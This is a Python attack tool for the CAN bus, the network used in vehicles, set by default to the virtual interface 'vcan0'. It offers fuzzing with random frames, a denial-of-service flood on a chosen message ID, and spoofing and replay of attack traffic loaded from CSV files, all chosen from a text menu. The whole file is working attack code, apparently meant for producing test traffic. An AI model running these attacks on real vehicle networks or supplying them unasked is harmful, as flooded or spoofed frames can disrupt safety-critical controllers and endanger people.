import random
import os
import base64
import threading
import can
import pandas as pd
import time


def send_fuzzy_attack(time, channel):
    i = 0
    bus = can.interface.Bus(channel=channel, bustype='socketcan')
    while i < time:
        try:
            arbitration_id = int(hex(random.randrange(0, 2048)), base=16)
            # generate data
            length = random.randrange(0, 9)
            count = 0
            data = []
            while count < length:
                d = random.randrange(0, 100)
                data.append(d)
                count += 1
            # msg sent
            fuzzy_attack = can.Message(arbitration_id=arbitration_id, data=data)
            bus.send(fuzzy_attack)
            print(str(arbitration_id) + " " + str(data))
            print("Message sent on {}".format(bus.channel_info))

        except can.CanError:
            print("Message NOT sent")
        i += 1


def send_dos_attack(ID, channel):
    bus = can.interface.Bus(channel=channel, bustype='socketcan')
    while True:
        try:
            arbitration_id = int(ID, base=16)
            length = random.randrange(0, 9)
            count = 0
            data = []
            while count < length:
                d = random.randrange(0, 100)
                data.append(d)
                count += 1
            # msg sent
            dos_attack = can.Message(arbitration_id=arbitration_id, data=data)
            bus.send(dos_attack)
            print(str(arbitration_id) + " " + str(data))
            print("Message sent on {}".format(bus.channel_info))

        except can.CanError:
            print("Message NOT sent")
        except KeyboardInterrupt:
            break


def send_broadcast_spoofing_attack(file, channel, lastPeriod):
    bus = can.interface.Bus(channel=channel, bustype='socketcan')
    df = pd.read_csv(file)
    count = 0
    try:
        for index, row in df.iterrows():
            # string of ID
            id = int(str(row['ID']),16)
            length = int(row['Length'])
            timeInterval = float(row['Time_Interval']) * 100
            i = 0
            csv_data = []
            while i < length:
                header = "Data" + str(i)
                d = int(str(row[header]))
                csv_data.append(d)
                i += 1
            msg = can.Message(arbitration_id=id, data=csv_data, is_extended_id=False)
            task = bus.send_periodic(msg, period=timeInterval)
            assert isinstance(task,can.CyclicSendTaskABC)
            time.sleep(lastPeriod)
            task.stop()
            print(count)
            print(str(id) + " " + str(csv_data))
            print("Message sent on {}".format(bus.channel_info))
            count += 1
    except can.CanError:
        print("Message NOT sent")


def import_attack_data(file, channel):
    df = pd.read_csv(file)
    bus = can.interface.Bus(channel=channel, bustype='socketcan')
    count = 0
    try:
        for index, row in df.iterrows():
            # string of ID
            id = int(row['ID'])
            length = int(row['Length'])
            i = 0

            csv_data = []
            while i < length:
                header = 'Data'+str(i)
                d = int(str(row[header]), base=16)
                csv_data.append(d)
                i += 1
            msg = can.Message(arbitration_id=id, data=csv_data, is_extended_id=False)
            bus.send(msg)
            print(count)
            print(str(id) + " " + str(csv_data))
            print("Message sent on {}".format(bus.channel_info))
            count += 1
    except can.CanError:
        print("Message NOT sent")


def import_spoofing_attack_data(file, channel):
    df = pd.read_csv(file)
    bus = can.interface.Bus(channel=channel, bustype='socketcan')
    count = 0
    try:
        for index, row in df.iterrows():
            # string of ID
            id = int(str(int(row['ID'])),16)
            length = int(row['Length'])
            i = 0
            csv_data = []
            while i < length:
                header = 'Data' + str(i)
                d = int(row[header])
                csv_data.append(d)
                i += 1
            msg = can.Message(arbitration_id=id, data=csv_data, is_extended_id=False)
            bus.send(msg)
            print(count)
            print(str(id) + " " + str(csv_data))
            print("Message sent on {}".format(bus.channel_info))
            count += 1
    except can.CanError:
        print("Message NOT sent")


if __name__ == "__main__":
    #bus = input("interface: ")
    bus = 'vcan0'
    print("Select an option")
    print("1. Import CSV File | 2. Attack Generation | 3. Spoofing (fixed) | 4. Spoofing (offset)")
    selection = int(input())
    if selection == 1:
        file = input("Import Attack Traffic CSV File: ")
        import_attack_data(file, bus)
    elif selection == 2:
        print("Select an attack option")
        print("1. Fuzzy Attack | 2. DoS Attack | 3. Spoofing Attack")
        selection = int(input())
        if selection == 1:
            time = int(input("Attack Times: "))
            send_fuzzy_attack(time, bus)
        elif selection == 2:
            ID = input("Input ID(int): ")
            send_dos_attack(ID, bus)
    elif selection == 3:
        file = input("Import Attack Traffic CSV File: ")
        lastPeriod = input("Attack will lasft for (second): ")
        send_broadcast_spoofing_attack(file, bus, int(lastPeriod))
    elif selection == 4:
        file = input("Import Attack Traffic CSV File: ")
        import_spoofing_attack_data(file, bus)

